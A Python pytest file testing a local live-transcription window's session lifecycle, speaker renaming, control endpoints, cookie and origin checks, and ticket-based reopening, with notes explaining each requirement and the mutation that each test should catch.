def test_a_name_typed_after_the_session_reaches_lines_already_on_screen(live):
    """FR-1.3. The projection is render-time, so it must still reach back.

    A page opened AFTER the call gets the whole ring replayed through the new
    map -- which is what makes naming a late-arriving speaker worth anything.
    """
    surface = live.surface()
    surface.publish(LiveTurn(channel=LiveChannel.FAR, text="first",
                             speaker="A", turn_order=0, is_final=True))
    surface.publish(LiveTurn(channel=LiveChannel.FAR, text="second",
                             speaker="A", turn_order=1, is_final=True))
    surface.end_session()
    surface.set_name("A", "Dana")

    page = live.page(surface)
    payloads = page.read(6, timeout=2.0)
    turns = [p for p in payloads if p.get("kind") == "turn"]

    assert len(turns) == 2
    assert {t["display_name"] for t in turns} == {"Dana"}


def test_the_session_token_still_authorises_after_the_session_ends(live):
    """FR-1.1. The credential outlives the call because the page does.

    Its lifetime is still bounded by the window's, not by a clock: `stop()`
    retires it, and `close_window()` is the only thing that calls `stop()`.
    """
    surface = live.surface()
    token = surface.token
    surface.end_session()

    assert surface.authorises(token) is True

    surface.stop()

    assert surface.authorises(token) is False


def test_ending_the_session_clears_the_live_indicator(live):
    """FR-1.2, and it is a SECURITY control, not decoration.

    `live_surface_prd.md` FR-2.5 makes the indicator mean "audio is leaving this
    machine". Leaving it lit with no stream would be worse than closing the
    window: an indicator that lies about a metered egress path teaches the
    operator to stop believing it, and this project has shipped that defect
    once already.

    MUTATION: have `end_session` broadcast `live: True`, or broadcast nothing.
    """
    surface = live.surface()
    page = live.page(surface)
    page.read(2, timeout=2.0)

    surface.end_session()

    statuses = [p for p in page.read(3, timeout=2.0) if p.get("kind") == "status"]
    assert statuses, "the page was never told the session ended"
    assert statuses[-1]["live"] is False


def test_ending_the_session_twice_broadcasts_once(live):
    """Idempotent. Teardown reaches here from more than one path."""
    surface = live.surface()
    page = live.page(surface)
    page.read(2, timeout=2.0)

    surface.end_session()
    surface.end_session()
    surface.end_session()

    statuses = [p for p in page.read(4, timeout=1.0) if p.get("kind") == "status"]
    assert len(statuses) == 1


def test_the_page_renders_an_ended_state_that_is_not_the_live_state(page_source):
    """FR-1.2. The two states must not be mistakable for one another.

    Read off the served page: the ended badge exists, starts hidden, and says
    naming still works -- so the operator is told the affordance is there rather
    than having to discover it by trying.
    """
    assert 'id="ended"' in page_source
    assert 'id="ended" hidden' in page_source
    assert "names can still be changed" in page_source
    assert 'id="panel-ended"' in page_source
    # The live indicator keeps its own distinct identity and its pulsing dot.
    assert 'id="live-indicator"' in page_source
    assert "#ended" in page_source and "#live-indicator" in page_source


def test_the_page_never_overwrites_billed_seconds_with_unknown(page_source):
    """Two status messages arrive at the end of a call and only one carries the
    durations. A metered feature reporting `unknown` for a number it was told is
    worse than one that stays quiet.

    MUTATION: drop the `in status` guard, which restores the old unconditional
    write and makes the ordering of two payloads decide what the bill reads.
    """
    body = page_source.split("function onStatus")[1].split("function onProblem")[0]
    assert '"near_seconds" in status' in body
    assert '"far_seconds" in status' in body


def test_set_name_forwards_to_the_rename_sink(live):
    """FR-3.1's seam. The page is updated first; the archive second."""
    surface = live.surface()
    seen: List[tuple] = []
    surface.attach_rename_sink(lambda label, name: seen.append((label, name)))

    surface.set_name("A", "Dana")
    surface.set_name("A", "")

    assert seen == [("A", "Dana"), ("A", None)]
    # Cleared is `None`, not `""`: the archive's "clear this name" branch keys
    # on falsiness, but a caller passing the empty string through would make
    # `rename_speaker`'s signature and the surface's disagree about the value
    # that means "no name".


def test_the_sink_receives_the_name_the_page_was_given_not_the_raw_input(live):
    """FR-3.5's bound applies to the archive too. 64 chars, stripped.

    MUTATION: forward `name` instead of `cleaned`, which would put an unbounded,
    unstripped string into a document under YAML frontmatter.
    """
    surface = live.surface()
    seen: List[tuple] = []
    surface.attach_rename_sink(lambda label, name: seen.append((label, name)))

    surface.set_name("A", "   " + "D" * 200 + "   ")

    assert seen == [("A", "D" * 64)]
    assert surface.speaker_names()["A"] == "D" * 64


def test_a_sink_that_raises_costs_the_archive_and_not_the_name(live):
    """FR-ERR-3. The page is what the operator is looking at; it cannot fail
    because a file on a Drive mount did.

    MUTATION: let the sink's exception propagate, which turns a name into a 500
    and loses it.
    """
    surface = live.surface()

    def exploding(label, name):
        raise OSError("the mount went away")

    surface.attach_rename_sink(exploding)

    status, _body = _post_as_page(surface, {"label": "A", "name": "Dana"})

    assert status == 200
    assert surface.speaker_names() == {"A": "Dana"}


def test_the_sink_is_called_without_holding_the_surface_lock(live):
    """A deadlock, not a nicety.

    `LiveArchive.stop()` holds `_finalise_lock` while it renders, and rendering
    calls `speaker_names()`, which takes the surface lock. `rename_speaker`
    takes `_finalise_lock`. If `set_name` called the sink while holding the
    surface lock, the teardown thread would hold `_finalise_lock` wanting the
    surface lock while the HTTP thread held the surface lock wanting
    `_finalise_lock` -- the operator's keystroke deadlocked against the end of
    their own call.

    Asserted by having the sink do from ANOTHER thread exactly what the render
    does: take the surface lock. If `set_name` still holds it, this blocks.

    MUTATION: move the sink call inside the `with self._lock:` block.
    """
    surface = live.surface()
    reached = threading.Event()

    def sink(label, name):
        def other_thread():
            surface.speaker_names()
            reached.set()

        worker = threading.Thread(target=other_thread, daemon=True)
        worker.start()
        worker.join(timeout=2.0)

    surface.attach_rename_sink(sink)
    surface.set_name("A", "Dana")

    assert reached.is_set(), "set_name held its lock across the sink call"


def test_stopping_the_surface_drops_the_sink(live):
    """A torn-down surface must not be able to call into a finalised archive."""
    surface = live.surface()
    seen: List[tuple] = []
    surface.attach_rename_sink(lambda label, name: seen.append((label, name)))

    surface.stop()
    surface.set_name("A", "Dana")

    assert seen == []


# -- the controller's half ---------------------------------------------------


def _ended_with_transcript(controller, tmp_path):
    """A finished session that actually wrote a transcript, so the window stays."""
    harness = controller(archive_dir=tmp_path / "archive")
    harness.controller.start()
    archive = harness.archive
    archive._wav_path = tmp_path / "archive" / "call.mp3"
    archive._transcript_path = tmp_path / "archive" / "call.md"
    harness.controller.stop()
    return harness


def test_a_finished_call_leaves_the_window_open(controller, tmp_path):
    """FR-1.1 at the controller. The session ends; the window does not.

    MUTATION: call `surface.stop()` in `_teardown` as it did before phase 1f.
    """
    harness = _ended_with_transcript(controller, tmp_path)

    assert harness.controller.is_live is False
    assert harness.surface.ended == 1
    assert harness.surface.stopped == 0
    assert harness.resumes == 1, "the device claim must still be released"


def test_the_reopen_url_is_offered_when_the_window_survives(controller, tmp_path):
    """FR-5.4, applied to the half of the call it never covered.

    The most likely thing an operator does when a call ends is close the window
    — and the launch ticket minted at session start expired minutes ago. Without
    a fresh one the feature is reachable only by whoever happened not to close a
    tab, which is not a feature, it is luck.

    MUTATION: reuse `surface.url` (credential-free, so it cannot open a first
    window), or mint the SHORT launch TTL, which expires before the sentence
    announcing it can be read.
    """
    harness = _ended_with_transcript(controller, tmp_path)

    said = [e.message for e in harness.events
            if isinstance(e, Error) and "still open" in e.message]
    assert said, "the operator was never told the window survived"
    assert "Reopen it at" in said[-1]
    assert "?k=" in said[-1], "a credential-free URL cannot open a first window"
    # Minted at the READABLE lifetime, not the 10s launch one.
    assert harness.surface.ticket_ttls[-1] == 300.0


def test_the_reopen_url_is_not_offered_when_the_window_closed(controller, tmp_path):
    """Naming a URL that resolves to nothing is worse than naming none."""
    harness = controller(archive_dir=tmp_path / "archive")
    harness.controller.start()
    harness.archive._wav_path = tmp_path / "archive" / "call.mp3"
    harness.archive._transcript_path = None

    harness.controller.stop()

    said = [e.message for e in harness.events if isinstance(e, Error)]
    assert not any("Reopen it at" in m for m in said)
    assert not any("still open" in m for m in said)


def test_a_session_that_wrote_no_transcript_closes_its_window(controller, tmp_path):
    """The window is kept for a DOCUMENT to name into. With none there is
    nothing to name, and a bound server serving an empty page is the disclosure
    surface FR-1.6 named with none of the benefit.

    MUTATION: keep the window unconditionally -- which also leaves one up after
    a start that failed before the pump ever owned the session.
    """
    harness = controller(archive_dir=tmp_path / "archive")
    harness.controller.start()
    harness.archive._wav_path = tmp_path / "archive" / "call.mp3"
    harness.archive._transcript_path = None

    harness.controller.stop()

    assert harness.surface.stopped >= 1
    assert harness.surface.ended == 0


def test_a_failed_start_never_leaves_a_window_serving(controller):
    """A start that raised before the pump owned the session was never a call."""
    harness = controller()

    def refusing_subscribe(fn):
        raise RuntimeError("subscriber table is full")

    harness.bus.subscribe = refusing_subscribe

    with pytest.raises(LiveSessionError):
        harness.controller.start()

    assert harness.surface.stopped >= 1
    assert harness.surface.ended == 0


def test_the_next_session_closes_the_previous_window_before_it_opens(
    controller, tmp_path,
):
    """FR-1.4, and it is not tidiness.

    Two surfaces subscribed to the bus at once would put this session's turns on
    the LAST session's page -- a transcript leaking across calls. So the close
    happens in `start()`, before anything subscribes.

    MUTATION: close the old window in `_teardown` (which defeats the feature) or
    after the new subscription (which leaks).
    """
    harness = _ended_with_transcript(controller, tmp_path)
    first = harness.surface
    assert first.stopped == 0

    harness.controller.start()
    second = harness.surface

    assert second is not first
    assert first.stopped == 1
    assert first.rename_sink is None
    # The old page is off the bus, so this session's turns cannot reach it.
    first.published.clear()
    harness.bus.publish(Error(message="after", severity=Severity.INFO, context="live"))
    assert first.published == []


def test_app_shutdown_closes_a_window_a_finished_call_left_open(
    controller, tmp_path,
):
    """FR-1.4's other half. A page outliving the process that owns it is exactly
    the disclosure surface the original FR-1.6 was written against.

    MUTATION: make `shutdown()` an alias for `stop()`.
    """
    harness = _ended_with_transcript(controller, tmp_path)
    assert harness.surface.stopped == 0

    harness.controller.shutdown(reason="app shutting down")

    assert harness.surface.stopped == 1


def test_shutdown_is_safe_when_nothing_ever_ran(controller):
    """It runs from a signal handler, so it must be a no-op rather than a raise."""
    harness = controller()

    harness.controller.shutdown(reason="app shutting down")

    assert harness.controller.is_live is False


def test_closing_the_window_twice_is_a_no_op(controller, tmp_path):
    harness = _ended_with_transcript(controller, tmp_path)

    harness.controller.close_window()
    harness.controller.close_window()

    assert harness.surface.stopped == 1


def test_the_rename_sink_is_attached_only_when_there_is_a_recorder(
    controller, tmp_path,
):
    """A transcript-only session has nothing on disk for a rename to change, and
    a sink that silently discarded names would be worse than none at all."""
    with_archive = controller(archive_dir=tmp_path / "archive")
    with_archive.controller.start()
    assert with_archive.surface.rename_sink is not None

    without = controller(archive_dir=None)
    without.controller.start()
    assert without.surface.rename_sink is None


def test_a_post_session_rename_is_reported_to_the_operator(controller, tmp_path):
    """FR-3.3. The operator is changing a file the call-processing pipeline
    reads; that write is announced, not silent.

    MUTATION: drop the `_say`, or report every outcome at INFO -- which would
    render "the transcript was changed elsewhere" in the same style as success.
    """
    harness = _ended_with_transcript(controller, tmp_path)
    harness.archive.rename_result = RenameOutcome(
        applied=True, reason="applied", message="call.md: Speaker 1 is now Dana."
    )

    harness.surface.rename_sink("A", "Dana")

    said = [e for e in harness.events if isinstance(e, Error) and "Dana" in e.message]
    assert said, "the archive write was never announced"
    assert said[-1].severity is Severity.INFO
    assert said[-1].context == "live"


def test_a_refused_rename_is_reported_as_a_warning_not_as_success(
    controller, tmp_path,
):
    """Every non-applied outcome that carries a message means the document does
    NOT say what the panel says. That is a warning."""
    harness = _ended_with_transcript(controller, tmp_path)
    harness.archive.rename_result = RenameOutcome(
        applied=False, reason="anchor-gone",
        message="call.md: it no longer contains Speaker 1.",
    )

    harness.surface.rename_sink("A", "Dana")

    said = [e for e in harness.events if isinstance(e, Error)
            and "no longer contains" in e.message]
    assert said
    assert said[-1].severity is Severity.WARNING


def test_an_outcome_with_no_message_says_nothing(controller, tmp_path):
    """Nothing written yet, and already-says-that, are not events."""
    harness = _ended_with_transcript(controller, tmp_path)
    before = len([e for e in harness.events if isinstance(e, Error)])
    harness.archive.rename_result = RenameOutcome(
        applied=False, reason="no-transcript"
    )

    harness.surface.rename_sink("A", "Dana")

    after = len([e for e in harness.events if isinstance(e, Error)])
    assert after == before


# ---------------------------------------------------------------------------
# Window controls (phase 1h) -- ending and closing from the page
# ---------------------------------------------------------------------------


def _ended_with_transcript_via_button(controller, tmp_path):
    """A finished session ended from the PAGE rather than from the `l` key."""
    harness = controller(archive_dir=tmp_path / "archive")
    harness.controller.start()
    harness.archive._wav_path = tmp_path / "archive" / "call.mp3"
    harness.archive._transcript_path = tmp_path / "archive" / "call.md"
    harness.surface.request_control("stop")
    return harness


def test_the_control_endpoints_reach_the_controllers_own_transitions(
    controller, tmp_path,
):
    """FR-2.2. A route to the transitions, never a second implementation.

    `stop` and `close_window` own the device claim, the archive finalisation
    and the offload resumption. A button that reimplemented any of that would
    be a second teardown to keep in agreement with the first.

    MUTATION: have the endpoint set `_live = False` itself, or call
    `surface.stop()` directly instead of `close_window()`.
    """
    harness = controller(archive_dir=tmp_path / "archive")
    harness.controller.start()
    assert set(harness.surface.control_sinks) == {"stop", "close"}
    # A transcript exists, so the phase-1f rule applies and the window survives
    # the stop -- which is what makes the second button reachable at all.
    harness.archive._wav_path = tmp_path / "archive" / "call.mp3"
    harness.archive._transcript_path = tmp_path / "archive" / "call.md"

    harness.surface.request_control("stop")

    assert harness.controller.is_live is False
    assert harness.resumes == 1, "the device claim was not released"
    assert harness.surface.ended == 1
    assert harness.surface.stopped == 0, "the window went down with the session"


def test_a_stop_from_the_window_says_where_it_came_from(controller, tmp_path):
    """The operator can tell a button stop from an `l` stop in the log.

    MUTATION: pass no reason, which collapses the two into one line -- the
    defect `stop(reason=...)` was introduced to fix in the first place.
    """
    harness = _ended_with_transcript_via_button(controller, tmp_path)

    said = [e.message for e in harness.events
            if isinstance(e, Error) and "Live transcription ended" in e.message]
    assert said, "the stop was never announced"
    assert "live window" in said[-1], said[-1]


def test_close_from_the_window_takes_the_surface_down(controller, tmp_path):
    """FR-1.2. The third trigger for the same teardown, not a new lifetime."""
    harness = _ended_with_transcript_via_button(controller, tmp_path)
    assert harness.surface.stopped == 0

    harness.surface.request_control("close")

    assert harness.surface.stopped == 1


def test_control_actions_are_idempotent(controller, tmp_path):
    """FR-1.3/FR-1.4. A double click, a retry, or a click racing the `l` key.

    MUTATION: drop the `if not self._live: return` guard in `stop`, or the
    `_ended_surface is None` guard in `close_window`.
    """
    harness = _ended_with_transcript_via_button(controller, tmp_path)

    harness.surface.request_control("stop")   # already ended
    harness.surface.request_control("close")
    harness.surface.request_control("close")

    assert harness.surface.stopped == 1
    assert harness.resumes == 1


def test_a_composition_with_no_controller_refuses_nothing_and_does_nothing(live):
    """FR: `request_control` returning False is not an error to the endpoint.

    The route stays authorised and idempotent; there is simply nothing wired.
    """
    surface = live.surface()

    assert surface.request_control("stop") is False
    assert surface.request_control("close") is False


def test_a_control_action_runs_OFF_the_request_thread(live):
    """FR-2.3, and it is the load-bearing requirement of this whole PRD.

    `controller.stop()` joins the capture pump for five seconds and then
    transcodes; `close_window()` shuts down the socket the response has to
    travel on. Doing either inline is a browser timeout at best and a response
    that never arrives at worst.

    Asserted on the THREAD, not on timing: the sink must not run on the thread
    that asked for it.

    MUTATION: call the sink directly in `request_control`.
    """
    surface = live.surface()
    seen = {}
    done = threading.Event()

    def sink():
        seen["thread"] = threading.current_thread()
        done.set()

    surface.attach_control_sinks(stop=sink)
    caller = threading.current_thread()

    assert surface.request_control("stop") is True
    assert done.wait(timeout=3.0), "the action never ran"
    assert seen["thread"] is not caller


def test_the_response_is_sent_before_the_action_runs(live):
    """FR-2.3 from the HTTP side: 'accepted' arrives, then the work happens."""
    surface = live.surface()
    release = threading.Event()
    started = threading.Event()

    def slow_sink():
        started.set()
        release.wait(timeout=5.0)

    surface.attach_control_sinks(stop=slow_sink)

    status, body = _post_as_page(surface, {}, path="/stop")

    assert status == 200
    assert "accepted" in body
    assert started.wait(timeout=3.0), "the action never started"
    release.set()


def test_a_close_still_delivers_its_response_though_it_kills_the_socket(live):
    """FR-2.3's actual failure mode, and the reason the order is not cosmetic.

    `/close` tears down the server the response has to travel on. If the action
    ran before the write, the operator's browser would get a connection reset
    for an action that SUCCEEDED -- which reads as a failure and invites a
    retry against a server that is already gone.

    The sink here is the real teardown, so the race is genuine rather than
    simulated: it stops this very surface.

    MUTATION: move `request_control` above `_respond`.

    No flush is involved and none is needed: `BaseHTTPRequestHandler.wbufsize`
    is 0, so `wfile` is a `_SocketWriter` that `sendall`s on every write
    (verified 2026-09-11). An explicit flush here was written, measured to be a
    no-op by a mutation that no test could catch, and removed.
    """
    surface = live.surface()
    gone = threading.Event()

    def real_close():
        surface.stop()
        gone.set()

    surface.attach_control_sinks(close=real_close)

    status, body = _post_as_page(surface, {}, path="/close")

    assert status == 200, "the response was lost to the teardown it triggered"
    assert "accepted" in body
    assert gone.wait(timeout=3.0), "the close never ran"
    assert surface.running is False


def test_the_handler_answers_a_control_route_before_dispatching_it(page_source):
    """The ordering, read off the source.

    The behavioural tests above cannot pin this on `/stop`: the dispatch is
    asynchronous, so a handler that dispatched first would still answer
    promptly and look identical. Only `/close` exposes it at runtime, and only
    because it destroys its own socket. So the rule is also asserted directly,
    where it is written.

    MUTATION: move `request_control` above `_respond`.
    """
    source = (SRC / "live_server.py").read_text()
    body = source.split('if path in ("/stop", "/close"):')[1].split("payload = self._body()")[0]
    assert body.index("_respond(200") < body.index("request_control(action)"), (
        "the action is dispatched before the request is answered"
    )


def test_a_control_sink_that_raises_never_reaches_the_request(live, caplog):
    """FR-ERR-1/FR-ERR-2. The response is already sent; a raise must not escape
    into the server's thread pool and must not take the surface with it."""
    surface = live.surface()
    ran = threading.Event()

    def exploding():
        ran.set()
        raise RuntimeError("teardown blew up")

    surface.attach_control_sinks(close=exploding)

    with caplog.at_level(logging.WARNING):
        status, _ = _post_as_page(surface, {}, path="/close")
        assert ran.wait(timeout=3.0)
        # The thread has to finish unwinding before its log record exists.
        deadline = time.monotonic() + 3.0
        while time.monotonic() < deadline:
            if any("control action failed" in r.getMessage() for r in caplog.records):
                break
            time.sleep(0.02)

    assert status == 200
    assert surface.running is True, "a failed action took the surface down"
    # Caught and REPORTED, not merely survived. An exception left to escape a
    # daemon thread prints to stderr, which no operator is reading, and this
    # test would pass on "the surface is still up" alone.
    assert any("control action failed" in r.getMessage() for r in caplog.records), (
        "the failure was never reported: " + repr([r.getMessage() for r in caplog.records])
    )
    assert "teardown blew up" not in "\n".join(
        r.getMessage() for r in caplog.records
    ), "the log carries the raw exception text rather than its type"


@pytest.mark.parametrize("path", ["/stop", "/close"])
def test_a_control_post_without_the_cookie_is_refused(live, path):
    """FR-ERR-3. These stop a capture session holding a USB device claim, so the
    auth is exactly `/names`'s and is checked in the same order."""
    surface = live.surface()
    ran = threading.Event()
    surface.attach_control_sinks(stop=ran.set, close=ran.set)

    status, _ = _post(_url(surface, path), {}, cookie=None)

    assert status == 403
    assert not ran.is_set(), "an unauthenticated request performed the action"


@pytest.mark.parametrize("path", ["/stop", "/close"])
def test_a_control_post_from_another_origin_is_refused(live, path):
    """The cookie is ambient: `SameSite` is computed on scheme+host and ignores
    the PORT, so any other loopback page can attach it. This is the defect a
    previous fix introduced, and the control routes must not reintroduce it.

    MUTATION: check the origin after dispatching, or not at all.
    """
    surface = live.surface()
    ran = threading.Event()
    surface.attach_control_sinks(stop=ran.set, close=ran.set)

    status, _ = _post(
        _url(surface, path), {},
        cookie=_session_cookie(surface),
        headers={"Origin": "http://127.0.0.1:9"},
    )

    assert status == 403
    assert not ran.is_set()


@pytest.mark.parametrize("path", ["/stop", "/close"])
def test_a_control_post_with_a_non_json_content_type_is_refused(live, path):
    """A cross-origin form post cannot set this header; that is why it is checked."""
    surface = live.surface()
    ran = threading.Event()
    surface.attach_control_sinks(stop=ran.set, close=ran.set)

    status, _ = _post(
        _url(surface, path), {},
        cookie=_session_cookie(surface),
        headers={"Content-Type": "text/plain"},
    )

    assert status == 403
    assert not ran.is_set()


def test_an_unknown_control_path_is_still_not_found(live):
    """MUTATION: widen the path check to a prefix or a `startswith`."""
    surface = live.surface()

    status, _ = _post_as_page(surface, {}, path="/stop-everything")

    assert status == 404


def test_stopping_the_surface_drops_the_control_sinks(live):
    """A torn-down surface must not be able to drive a finished controller."""
    surface = live.surface()
    surface.attach_control_sinks(stop=lambda: None, close=lambda: None)

    surface.stop()

    assert surface.request_control("stop") is False


def test_no_log_record_carries_the_token_when_a_control_is_refused(live, caplog):
    """NFR-3. The refusal is logged; the credential never is."""
    surface = live.surface()
    with caplog.at_level(logging.DEBUG):
        _post(_url(surface, "/stop"), {}, cookie=None)

    blob = "\n".join(r.getMessage() for r in caplog.records)
    assert surface.token not in blob


# -- the page's half ---------------------------------------------------------


def test_the_page_carries_both_buttons_disabled_until_status_says_otherwise(
    page_source,
):
    """FR-1.5. Painted from the stream, never from what the page last clicked."""
    assert 'id="btn-stop"' in page_source
    assert 'id="btn-close"' in page_source
    assert page_source.count("disabled>") >= 2, "a button ships enabled"
    assert "paintControls" in page_source


def test_close_is_unavailable_while_the_session_is_live(page_source):
    """FR-2.9. No single control may both end a call and destroy the window its
    speakers could be named in.

    MUTATION: `btnClose.disabled = false`, or key it on the same flag as stop.
    """
    body = page_source.split("function paintControls")[1].split("function ")[0]
    assert "btnStop.disabled = live !== true" in body
    assert "btnClose.disabled = live !== false" in body


def test_each_button_needs_two_clicks(page_source):
    """FR-2.8. A click in a browser over a video call is not a deliberate act.

    MUTATION: fire on the first click; or never disarm, leaving a button one
    click from ending a call an hour later.
    """
    body = page_source.split("function arm(")[1].split("var disarmStop")[0]
    assert 'classList.contains("armed")' in body
    assert "Confirm: " in body
    assert "setTimeout(disarm" in body


def test_a_deliberate_close_does_not_render_as_reconnecting(page_source):
    """FR-2.6/FR-2.7, and the same class of defect as an indicator that will not
    clear: a status line that lies about a server nobody is coming back to.

    The discriminator is the page's own memory of what it asked for, because a
    close and a drop arrive at `onerror` as an identical event.

    MUTATION: drop the `closing` guard, or set it for `/stop` as well -- which
    would make an ordinary end-of-call look like a closed session.
    """
    body = page_source.split("stream.onerror = function")[1].split("stream.onmessage")[0]
    assert "if (closing)" in body
    assert "session closed" in body
    assert 'conn.textContent = "reconnecting"' in body, (
        "a real drop must still say reconnecting"
    )
    # Structural, not textual: the closing branch must short-circuit BEFORE the
    # reconnect timer is ever armed. Comparing substring positions would compare
    # prose, since both words appear in the comments explaining them.
    guard = body.index("if (closing)")
    timer = body.index("dropped = setTimeout")
    assert guard < timer
    assert "return;" in body[guard:timer], (
        "the closing branch falls through into the reconnect timer"
    )
    # Only `/close` arms it.
    armed = page_source.split('if (action === "close")')[1][:60]
    assert "closing = true" in armed


# ---------------------------------------------------------------------------
# Reopening the window (phase 1i) -- `o`
# ---------------------------------------------------------------------------
#
# The lockout this answers is wider than it looks, and both halves were measured
# 2026-09-11 rather than read:
#
#   * `detach()` removes a subscriber and stops nothing, so closing the browser
#     tab leaves the server fully bound -- DURING a call as well as after one.
#   * `start()` publishes the manual URL exactly once, minted at 300s, and
#     nothing re-mints during the call.
#
# So on any call longer than five minutes, an operator who closes the tab is
# locked out of a session that is still streaming and still billing.
#
# Assertion hygiene, because both traps are live here: `"o" in message.lower()`
# is not an assertion (the unmapped-key fall-through contains an `o`), and
# "a URL was logged" passes against `http://127.0.0.1:0/?k=...`, which cannot
# connect to anything.


def test_o_reopens_the_window_of_a_LIVE_session(controller):
    """The wider half of the bug, and the one the original report missed.

    MUTATION: select `self._ended_surface` only -- which refuses the operator
    whose call is mid-flight, with AssemblyAI egress running.
    """
    harness = controller()
    harness.controller.start()
    launched_at_start = len(harness.launched)

    assert harness.controller.reopen_window() is None

    assert len(harness.launched) == launched_at_start + 1
    assert f":{harness.surface.port}/" in harness.launched[-1]
    assert "?k=" in harness.launched[-1]


def test_o_reopens_the_window_kept_after_a_call(controller, tmp_path):
    """The reported half. The window outlives the session; the way in must too."""
    harness = _ended_with_transcript(controller, tmp_path)
    launched = len(harness.launched)

    assert harness.controller.reopen_window() is None

    assert len(harness.launched) == launched + 1
    said = harness.messages()
    assert "saved transcript" in said, (
        "the post-call wording did not say why the window still matters"
    )


def test_the_two_cases_are_worded_differently(controller, tmp_path):
    """FR-2.2. The operator's next action differs, so the sentence must.

    MUTATION: one shared headline, which tells an operator mid-call that their
    names are being written to a transcript that does not exist yet.
    """
    live = controller()
    live.controller.start()
    live.controller.reopen_window()
    live_said = live.messages()

    ended = _ended_with_transcript(controller, tmp_path)
    ended.controller.reopen_window()
    ended_said = ended.messages()

    assert "Reopening the live window" in live_said
    assert "Reopening the live window" not in ended_said
    assert "last call" in ended_said


def test_every_press_mints_a_fresh_ticket(controller):
    """FR-1.7. A cached URL is the single most natural wrong implementation, and
    it is dead 300 seconds later.

    MUTATION: compute the URL once in `start()` and hand the same string back.
    """
    harness = controller()
    harness.controller.start()

    harness.controller.reopen_window()
    harness.controller.reopen_window()

    urls = harness.launched[1:]
    assert len(urls) == 2
    assert urls[0] != urls[1], "the same ticket was handed out twice"


def test_reopen_mints_a_short_argv_ticket_and_a_long_one_for_the_log(controller):
    """FR-2.6. The invariant is about DESTINATION: argv is world-readable, and a
    human needs time to read a URL off a screen.

    MUTATION: mint one ticket and use it for both -- at 300s it puts a
    five-minute credential on a command line every process can read; at 10s it
    logs a URL that is dead before it can be typed.
    """
    harness = controller()
    harness.controller.start()
    before = len(harness.surface.ticket_ttls)

    harness.controller.reopen_window()

    ttls = harness.surface.ticket_ttls[before:]
    assert len(ttls) == 2, f"expected two tickets per press, got {ttls}"
    manual, argv = ttls
    assert argv < manual
    assert argv <= 15
    assert manual >= 60


def test_the_reopen_url_in_the_log_is_not_the_one_given_to_the_browser(controller):
    """FR-2.7. Crossing them puts the long-lived ticket into argv.

    MUTATION: pass `manual_url` to the launcher.
    """
    harness = controller()
    harness.controller.start()
    harness.controller.reopen_window()

    assert harness.launched[-1] not in harness.messages()


def test_the_reopen_url_is_said_before_the_browser_is_launched(controller):
    """FR-2.8/FR-5.4: ALWAYS, not on failure.

    Not merely the original rationale -- a SHIPPED string would become false.
    `launch_app_window`'s total-failure return is "no browser could be opened;
    use the URL in the activity log", and the raise branch says "open the URL
    above". Both presuppose a URL that is already there.

    MUTATION: publish the URL only from the launch-failure branch.
    """
    harness = controller()
    harness.controller.start()
    order: List[str] = []
    harness.bus.subscribe(
        lambda e: order.append("said")
        if isinstance(e, Error) and "Reopening" in e.message
        else None
    )
    real_launch = harness.controller._launch_browser
    harness.controller._launch_browser = lambda url, **kw: (
        order.append("launched") or real_launch(url, **kw)
    )

    harness.controller.reopen_window()

    assert order == ["said", "launched"], order


def test_a_stopped_surface_is_refused_in_words_never_with_a_port_zero_url(
    controller, tmp_path,
):
    """FR-2.3/FR-2.4, and the trap the obvious implementation walks into.

    `mint_ticket` has no `_running` guard where `redeem_ticket` has one, and
    `port` returns the sentinel 0 once the server is gone -- so a stopped
    surface composes `http://127.0.0.1:0/?k=...` and returns it cheerfully. The
    browser then says "this site can't be reached", which reads as the app being
    broken rather than a link having expired: a WORSE signal than the 403 this
    whole feature removes.

    MUTATION: drop the `surface.running`/`surface.port` check and trust the
    surface to refuse. It does not.
    """
    harness = _ended_with_transcript(controller, tmp_path)
    launched = len(harness.launched)
    harness.surface._port = 0          # what `port` returns once `_server` is None

    refusal = harness.controller.reopen_window()

    assert refusal is not None
    assert "http" not in refusal, f"a URL was offered for a dead surface: {refusal}"
    assert "127.0.0.1:0" not in harness.messages()
    assert len(harness.launched) == launched, "a dead address was handed to a browser"


def test_reopen_with_no_surface_at_all_says_what_would_create_one(controller):
    """FR-1.5. A refusal that does not name the next action is a dead end."""
    harness = controller()

    refusal = harness.controller.reopen_window()

    assert refusal is not None
    assert "press l" in refusal
    assert harness.launched == []


def test_reopen_never_raises_even_when_the_surface_misbehaves(controller):
    """FR-ERR-1. `KeyboardReader._run` swallows exceptions, so a raise on that
    thread is SILENCE -- the one outcome a key must never produce.

    MUTATION: let the mint or the launch propagate.
    """
    harness = controller()
    harness.controller.start()

    class Exploding:
        running = True
        port = 5

        def launch_url(self, ttl):
            raise RuntimeError("the ticket table is on fire")

    harness.controller._surface = Exploding()

    refusal = harness.controller.reopen_window()

    assert refusal is not None
    assert "on fire" in refusal


def test_reopen_does_not_restart_or_resubscribe_the_surface(controller):
    """FR-1.6. `start()` wipes the ring, the names and the token -- a reopen that
    reached it would destroy the transcript the operator came back for.

    MUTATION: call `surface.start()` before minting, 'to be safe'.
    """
    harness = controller()
    harness.controller.start()
    harness.surface.names["A"] = "Dana"
    started = harness.surface.started

    harness.controller.reopen_window()

    assert harness.surface.started == started, "the surface was restarted"
    assert harness.surface.stopped == 0
    assert harness.surface.names == {"A": "Dana"}, "the name map was wiped"


def test_start_and_reopen_share_one_launch_implementation(controller):
    """FR-2.10, read off the source.

    Two copies of this sequence would be two matching expressions holding a
    security property -- which ticket may reach argv -- in agreement by
    convention. That is the arrangement `10fba18` and the duplicated
    `Invalid API key` vocabulary already cost this repo.

    MUTATION: inline the say/launch/report block into `reopen_window`.
    """
    source = (SRC / "live_server.py").read_text()
    assert source.count("self._launch_browser(") == 1, (
        "the browser launch has more than one call site"
    )
    body = source.split("def reopen_window")[1].split("\n    def ")[0]
    assert "_offer_window(" in body
    assert "_launch_browser" not in body


def test_no_log_record_carries_the_session_token_on_reopen(controller, caplog):
    """NFR-3. The ticket is in the log by design; the TOKEN never is."""
    harness = controller()
    harness.controller.start()
    with caplog.at_level(logging.DEBUG):
        harness.controller.reopen_window()

    blob = "\n".join(r.getMessage() for r in caplog.records) + harness.messages()
    assert harness.surface.token not in blob
